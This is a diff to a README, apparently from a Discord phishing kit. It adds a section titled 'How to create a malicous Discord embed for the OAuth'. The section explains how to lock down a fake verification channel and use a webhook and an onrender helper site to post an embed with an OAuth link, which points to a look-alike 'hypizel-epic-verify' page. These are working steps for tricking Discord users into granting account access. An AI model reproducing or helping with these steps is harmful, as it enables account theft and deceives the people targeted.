@@ -27,3 +27,17 @@
 https://hypizel-epic-verify.onrender.com/verify
 
 Your setup is now complete, and users can access the verification page using the provided URL.
+
+# How to create a malicous Discord embed for the OAuth
+> **Important:**
+> The website for sending the Embed might take a while to load since its hosted on onrender.
+
+Create a verification channel in your Discord server and ensure the premissions are set so users can't do these things:
+  Send messages,
+  React to messages,
+  Create public threads,
+  Create private threads
+
+Then you can create a webhook for your verification channel, input this webhook and your recently created OAuth link on this website https://oauth-link-2-embed.onrender.com.
+
+Once you press send a Discord embed with your OAuth link should swiftly apear.
